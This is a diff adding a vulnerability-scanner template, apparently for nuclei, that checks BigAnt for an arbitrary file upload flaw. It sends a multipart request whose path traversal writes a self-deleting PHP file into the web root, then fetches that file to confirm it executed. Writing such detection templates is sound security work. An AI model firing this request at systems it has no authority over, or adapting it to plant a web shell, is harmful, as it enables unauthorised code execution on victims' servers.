@@ -1,0 +1,45 @@
+id: bigant-uploadfile
+info:
+  name: BigAnt - 任意文件上传漏洞
+  author: Chaitin
+  severity: high
+  metadata:
+    verified: true
+    max-request: 2
+    vendor: bigant
+    product: bigant
+  tags: file-upload,vuln,bigant
+variables:
+  boundary: '{{to_lower(rand_text_alpha(8))}}'
+  filename: '{{to_lower(rand_text_alpha(8))}}'
+  randcon: '{{to_lower(rand_text_alpha(10))}}'
+flow: http(1) && http(2)
+http:
+  - method: POST
+    path:
+      - '{{BaseURL}}/index.php/Api/DispersedAddin/upload_file'
+    redirects: false
+    headers:
+      Content-Type: multipart/form-data; boundary={{boundary}}
+    body: |
+      --{{boundary}}
+      Content-Disposition: form-data; name="file"; filename="file"
+
+      <?php @error_reporting(0);echo "{{randcon}}";unlink(__FILE__);?>
+
+      --{{boundary}}
+      Content-Disposition: form-data; name="file_info";
+
+      [{"file_path": "../../im_webserver/www/{{filename}}.php", "file_name": "test.txt", "file_size": "1024"}]
+      --{{boundary}}--
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(body, ''{"status":1'')'
+  - method: GET
+    path:
+      - '{{BaseURL}}/{{filename}}.php'
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(body, randcon)'
